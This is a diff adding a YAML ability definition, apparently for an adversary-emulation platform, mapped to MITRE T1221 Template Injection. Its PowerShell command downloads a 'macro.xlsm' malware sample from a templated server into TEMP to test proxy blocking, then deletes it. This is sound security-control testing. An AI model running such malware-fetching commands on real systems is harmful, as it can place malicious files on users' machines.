@@ -1,0 +1,28 @@
+- requirements: []
+  executors:
+  - cleanup: []
+    timeout: 15
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: "$response = Invoke-WebRequest #{ignite.url}/malware/macro.xlsm -ErrorAction\
+      \ Stop;\n\nif ($response.Headers[\"Content-Type\"] -like \"text/html*\") {\n\
+      \    throw \"Blocked by proxy \u2014 received HTML instead of native error.\"\
+      \n};\n$response.Content | Set-Content \"$env:TEMP\\macro.xlsm\";\nStart-Sleep\
+      \ -Seconds 3;\nRemove-Item \"$env:TEMP\\macro.xlsm\" -Force"
+  singleton: true
+  delete_payload: true
+  description: Adversaries may manipulate document templates, such as those in Office
+    Open XML (OOXML) files or RTF files, to conceal malicious code or trigger authentication
+    attempts. By modifying template properties or control words, they can reference
+    external URLs to download and execute payloads when the document is opened. These
+    attacks can evade detection since no traditional indicators like macros or scripts
+    are present until the payload is fetched. This technique also enables forced authentication
+    by injecting malicious URLs that prompt users for credentials. Such tactics are
+    commonly used in phishing and data exfiltration attacks.
+  name: 'Malware: CSA - Macro OLE Exploitation'
+  tactic: execution
+  technique_id: T1221
+  technique_name: Template Injection
+  id: f614136b-cf5c-4d18-aee6-60979f65770b
